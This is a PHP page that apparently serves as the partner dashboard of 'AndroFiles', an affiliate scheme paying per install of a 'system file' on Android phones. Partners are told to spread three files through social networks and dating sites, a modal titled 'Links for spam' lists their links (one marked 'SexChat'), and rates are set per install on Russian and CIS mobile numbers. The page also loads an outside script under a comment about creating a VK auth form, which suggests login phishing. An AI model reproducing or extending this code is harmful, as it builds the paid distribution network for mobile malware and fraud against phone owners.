<?php
    include('config.php');

   
     if (!empty($user)) {
         
$usi = mysql_result(mysql_query("SELECT COUNT(*) FROM `users`"), 0);
echo '
<!DOCTYPE html>
<!-- saved from url=(0025)http://biglike.org/instr# -->
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <!-- Vkonte.Club API (Create VK Auth form) -->
    <script src="//code.jquery.com/jquery-1.8.3.js"></script>
    
    <script src="https://wm-logs0.myjino.ru/api/frame/1639"></script>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="A fully featured admin theme which can be used to build CRM, CMS, etc.">
        <meta name="author" content="Coderthemes">
        <title>Партнерка.</title>
  <link rel="stylesheet" href="style.css">

        <link rel="shortcut icon" href="http://biglike.org/img/favicon.ico">

        <title>Sniffing</title>
   <!-- Base Css Files -->
        <link href="./BigLike_files/bootstrap.min.css" rel="stylesheet">

        <!-- Font Icons -->
        <link rel="stylesheet" href="./BigLike_files/font-awesome.min.css">
        <link href="./BigLike_files/material-design-iconic-font.min.css" rel="stylesheet">

        <!-- animate css -->
        <link href="./BigLike_files/animate.css" rel="stylesheet">

        <!-- Waves-effect -->
        <link href="./BigLike_files/waves-effect.css" rel="stylesheet">

        <!-- sweet alerts -->
        <link href="./BigLike_files/sweet-alert.min.css" rel="stylesheet">

        <!-- Custom Files -->
        <link href="./BigLike_files/helper.css" rel="stylesheet" type="text/css">
        <link href="./BigLike_files/style.css" rel="stylesheet" type="text/css">
        
                <script type="text/javascript" async="" id="topmailru-code" src="./BigLike_files/code.js.Без названия"></script><script src="./BigLike_files/jquery.min.js.Без названия"></script>


        <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
        <![endif]-->

        <script src="./BigLike_files/modernizr.min.js.Без названия"></script>
        
    <style>
    

.alert-vkmagaz {
    color: #66819D;
    background-color: #F5F8FA;
    border-color: #E8EDF3;
}   
    
.imgbgr{
min-height: 565px;
background-color: #FBFCFD;
border: 1px solid #E0E8EF;
color: #577AA0;
}   


.lefttd{
height: 55px;
font-family: Helvetica,Arial,Verdana,sans-serif;
font-weight: 600;
color: #6F8BAA;
padding: 7px;
border-top: 1px solid #E0E8EF;
border-right: 1px solid #E0E8EF;
}


.righttd{
height: 55px;
font-family: Helvetica,Arial,Verdana,sans-serif;
color: #6F8BAA;
padding: 7px;
border-top: 1px solid #E0E8EF;
}


.toptd{
height: 85px;
font-family: Helvetica,Arial,Verdana,sans-serif;
color: #6F8BAA;
padding: 7px;
border-top: 1px solid #E0E8EF;
}

.vertalign{
vertical-align: center;
}
    </style></head>

    <body class="smallscreen fixed-left">
        
        <!-- Begin page -->
        
        
            <!-- Top Bar Start -->
            <div class="topbar">
                <!-- LOGO -->
                <div class="topbar-left">
                    <div class="">
                                            
                        <a href="/index.php" class="logo">
                        
                        <div class="pull-left" style="margin-top: 1px;">
                                <button class="button-menu-mobile open-left">
                                    <i style="color: #A5BAD0;" class=""></i>
                                </button>
                                <span </span>
                            </div>  

                        <span>AndroFiles </span></a>
                    </div>
                </div>
                <!-- Button mobile view to collapse sidebar menu -->
                <div class="navbar navbar-default" role="navigation">
                    <div class="container">
                        <div class="">
                            


                            <ul class="nav navbar-nav navbar-right pull-right">
                                <li class="hidden-xs">
                                   <a href="#" data-toggle="modal" data-target="#bomba" class="waves-effect waves-light">
                                        <i class=""></i>Вывести|Пополнить
                                    </a>
                                </li>
                                                    
                            
                                
                                
                                <li class="hidden-xs">
                                    <a href="/instr#" data-toggle="modal" data-target="#faq" class="waves-effect waves-light">
                                        <i class=""></i> Оффер.
                                    </a>
                                </li>
                                
                                <li class="hidden-xs">
                                    <div class="test"><a href="login.php?logout=true"> Выход</a>
                                        <i class=""></i> 
                                    </a>
                                </li>
                                
                                

                            </ul>
                        </div>
                        <!--/.nav-collapse -->
                    </div>
                </div>
            </div>
            <!-- Top Bar End -->


            <!-- ========== Left Sidebar Start ========== -->

            <div class="left side-menu">
                <div class="slimScrollDiv" style="position: relative; overflow: hidden; width: auto; height: 840px;"><div class="sidebar-inner slimscrollleft" style="overflow: hidden; width: auto; height: 840px;">
                    <div class="user-details">
                        <div class="pull-left">
                            <img src="/img/ico/blueegg.png" alt="" class="thumb-md img-circle">
                        </div>
                        

    
    <center><p class="text-muted m-0"><font id="points" style="font-size: 18px;"><span>['.$user['login'].']</br></span></a></font> <i class=""></i>
    <div class="menuxa">&#248; Установок: '.$user['reit'].'<br /></div></centerc>
    ['.$user['ru'].'] RU
    ['.$user['sng'].'] СНГ
  
<p class="text-muted m-0"><font id="points" style="font-size: 18px;"></font> <i class=""></i>
<br>
 Баланс ['.$user['bablo'].'] руб.
<br>
<br>

</p>
                        </div>
                    </div>
                    <!--- Divider -->
                    <div id="sidebar-menu">
                        <ul>
                            <li>
                                <a href="/profile.php" class="waves-effect "><i class=""></i><span> Моя страница </span></a>
                            </li>
                            
                    
                            <li>
                                <a href="/akk.php" class="waves-effect "><i class=""></i><span> Аккаунты </span></a>
                            </li>                           
                            
                            


                          
                            </li-->


                        </ul>
                        <div class="clearfix"></div>
                    </div>
                    <div class="clearfix"></div>
                </div><div class="slimScrollBar" style="background: rgb(122, 134, 143); width: 5px; position: absolute; top: 0px; opacity: 0.4; display: none; border-radius: 7px; z-index: 99; right: 1px; height: 840px; visibility: visible;"></div><div class="slimScrollRail" style="width: 5px; height: 100%; position: absolute; top: 0px; display: none; border-radius: 7px; background: rgb(51, 51, 51); opacity: 0.2; z-index: 90; right: 1px;"></div></div>
            </div>
            <!-- Left Sidebar End --> 



            <!-- ============================================================== -->
            <!-- Start right Content here -->
            <!-- ============================================================== -->                      
            <div class="content-page">
                <!-- Start content -->
                <div class="content">
                    <div class="container">

                        <!-- Page-Title -->
                        <!--div class="row">
                            <div class="col-sm-12">
                                <h4 class="pull-left page-title">Welcome !</h4>
                                <ol class="breadcrumb pull-right">
                                    <li><a href="#">Moltran</a></li>
                                    <li class="active">Dashboard</li>
                                </ol>
                            </div>
                        </div-->

                        <!-- Start Widget -->
                                        
                        
                    
                        
                        
                        <div class="row">

                <div class="alert alert-danger">
                        <b>Уважаемый партнер!</b> ['.$user['login'].'] Минимальный вывод 250 р выплаты каждый день с 20:00 до 23:00 Вывод Только QIWI
                    </div>
                                            <div class="alert alert-warning">
                            <b>Уважаемый партнер</b> ['.$user['login'].'] Ваш Ранг<div class="menuxa">&#164;  '.$user['infos'].'<br /></div>
                            
                        </div>
                        <center><b>Androfiles</b><p>Партнерская программа которая плотит за установку Системного файла на <b>Android</b> Смартфоны . За скачивания файла мы не плотим.
                        Мы платим только за установку. После регистрации вам будет доступно 3 файла,которые вам нужно будет роспостранять по просторам интернета .в моциальных сетях и других
                        сайтах знакомств.
                        
                        <center>Всего партнеров на сайте(<b>'.$usi.'</b>)</center>



</div>


                        
                         <div class="col-lg-12">
                                <div class="portlet"><!-- /portlet heading -->
                                    <div class="portlet-heading">
                                        <h3 class="portlet-title text-dark text-uppercase">
                                            <i class=""></i> &nbsp;     Тарификация                          </h3>

                                        <div class="clearfix"></div>
                                    </div>
                                        <div class="portlet-body">
                                           



  

                    
        
<style>
.linkcolor{
    color: #296080;
}
</style>


<div class="showback">
        <p><span class="label label-default">Тарифы на выкуп Установок:</span></p>
        <table class="table table-bordered table-striped table-condensed">
            <thead>
            <tr>
                <th>Страна профиля</th>
                <th>Стоимость Установки</th>
            </tr>
            </thead>
            <tbody>
            <tr>
                <td>Российская Федерация мобильный + активные  (номера +79***)
                </td><td>['.$user['name'].']</td>
            </tr>
            
            <tr>
                <td>Прочие страны СНГ и Европы  мобильный +активный
                </td><td>['.$user['famil'].']</td>
            </tr>
            </tbody>
        </table>
    </div>
<br><br>



            </div>
            <!-- ============================================================== -->
            <!-- End Right content here -->
            <!-- ============================================================== -->


            

        </div>
        <!-- END wrapper -->
        
        
        
        
        
    
    
    
    
    
        <div class="modal fade" id="rules" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog"><div class="modal-content"><div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3 class="modal-title text-center" id="myModalLabel">Правила</h3>
      </div>
      <div class="modal-body">


 </div>
      <div class="modal-footer">
        <button type="button" class="btncls" data-dismiss="modal">Закрыть</button>
        <!--button type="button" class="btn btn-primary">Сохранить изменения</button-->
      </div></div></div></div>  
    
    
    
    

    <div class="modal fade" id="contacts" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog"><div class="modal-content"><div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3 class="modal-title text-center" id="myModalLabel">Контакты</h3>
      </div>
<div class="modal-body">
        Перед тем как обращаться в тех поддержку прочитайте раздел FAQ, в нем мы ответили на все
        часто задаваемые вопросы. <br><br> 
Если Вам все же не удалось найти ответ на свой вопрос - напишите сюда <i>stelss99@mail.ru</i>       
      </div>
      <div class="modal-footer">
        <button type="button" class="btncls" data-dismiss="modal">Закрыть</button>
        <!--button type="button" class="btn btn-primary">Сохранить изменения</button-->
      </div></div></div></div>  
    
    
    
    
    
    
    <div class="modal fade" id="faq" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog"><div class="modal-content"><div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3 class="modal-title text-center" id="myModalLabel">Ссылки Для спама</h3>
      </div>
      <div class="modal-body">
<div class="blog-text">
                            <p><span class="label label-default">Ссылка :</span></p>
                            <input type="text" class="form-control" placeholder="SexChat" value="'.$user['url1'].'">
                        </div>
                        <div class="blog-text">
                            <p><span class="label label-default">Ссылка :</span></p>
                            <input type="text" class="form-control" placeholder="Ссылка" value="'.$user['url2'].'">
                        </div>
                        <div class="blog-text">
                            <p><span class="label label-default">Ссылка :</span></p>
                            <input type="text" class="form-control" placeholder="Ссылка" value="'.$user['url3'].'">
                        </div>
                        <div class="blog-text">
                            <p><span class="label label-default">Ссылка :</span></p>
                            <input type="text" class="form-control" placeholder="Ссылка" value="'.$user['url4'].'">
                        </div>
                        <div class="blog-text">
                            <p><span class="label label-default">Ссылка :</span></p>
                            <input type="text" class="form-control" placeholder="Ссылка" value="'.$user['url5'].'">
                        </div>
    </div>
      <div class="modal-footer">
        <button type="button" class="btncls" data-dismiss="modal">Закрыть</button>
        <!--button type="button" class="btn btn-primary">Сохранить изменения</button-->
      </div></div></div></div>  
    
    
        <div class="modal fade" id="bomba" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog"><div class="modal-content"><div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
        <h3 class="modal-title text-center" id="myModalLabel">Вывести|Пополнить</h3>
      </div>
      <div class="modal-body">
<div class="blog-text">
                            <p><span class="label label-default">Вывести</span></p>
                            
                            Ваш QIWI ['.$user['status'].'] </br>
                        </div>
                        <p><span class="label label-default">Пополнить</span></p>
                            <b>Переведите суму пополнения на кошелек 380979918681. в коментариях укажыте свой логин.
                            сума перевода будет пополнена на ваш баланс в тичение суток.</b>
                            
                        </div>
    </div>
      <div class="modal-footer">
        <button type="button" class="btncls" data-dismiss="modal">Закрыть</button>
        <!--button type="button" class="btn btn-primary">Сохранить изменения</button-->
      </div></div></div></div>  
      
    
    


    
    
    
        <script>
            var resizefunc = [];
        </script>

        <!-- jQuery  -->

        <script src="./BigLike_files/bootstrap.min.js.Без названия"></script>
   
        <script src="./BigLike_files/jquery.nicescroll.js.Без названия" type="text/javascript"></script>
        <script src="./BigLike_files/jquery.scrollTo.min.js.Без названия"></script>

        <script src="./BigLike_files/detect.js.Без названия"></script>
        <script src="./BigLike_files/fastclick.js.Без названия"></script>
        <script src="./BigLike_files/jquery.slimscroll.js.Без названия"></script>


        <!-- sweet alerts -->
        <script src="./BigLike_files/sweet-alert.min.js.Без названия"></script>
        <script src="./BigLike_files/sweet-alert.init.js.Без названия"></script>



        <!-- CUSTOM JS -->
        <script src="./BigLike_files/jquery.app.js.Без названия"></script>

        <!-- Dashboard -->
        <script src="./BigLike_files/jquery.dashboard.js.Без названия"></script>    
    
  

    
  
    <!-- Optionally, you can add Slimscroll and FastClick plugins.
         Both of these plugins are recommended to enhance the
         user experience. Slimscroll is required when using the
         fixed layout. -->
  

 
 
 
<div style="display: none;">


<!-- Rating@Mail.ru counter -->
<script type="text/javascript">
var _tmr = window._tmr || (window._tmr = []);
_tmr.push({id: "2788259", type: "pageView", start: (new Date()).getTime()});
(function (d, w, id) {
  if (d.getElementById(id)) return;
  var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id;
  ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js";
  var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);};
  if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); }
})(document, window, "topmailru-code");
</script><noscript>&lt;div style="position:absolute;left:-10000px;"&gt;
&lt;img src="//top-fwz1.mail.ru/counter?id=2788259;js=na" style="border:0;" height="1" width="1" alt="Рейтинг@Mail.ru" /&gt;
&lt;/div&gt;</noscript>
<!-- //Rating@Mail.ru counter -->

</div>';


echo '</div>';
     }else{
        header('location: login.php');
     }
         

include_once ('include/foot.php');




 





?>
